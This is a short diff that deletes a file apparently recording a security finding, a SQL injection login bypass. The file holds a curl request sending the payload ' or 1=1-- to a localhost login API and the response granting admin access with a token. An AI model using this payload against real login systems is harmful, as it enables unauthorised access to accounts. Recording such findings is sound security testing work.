@@ -1,8 +1,0 @@
-===== DESCOBERTA-003 SQLi Auth Bypass =====
-$ curl -X POST http://localhost:5000/api/v1/login -d {username: ' or 1=1--}
-
-{
-  "message": "Welcome admin",
-  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.8xBjl3K5ByZAT-5Iu0Wc1Nx-XpS97LJEpYqJNFmBjtU"
-}
-
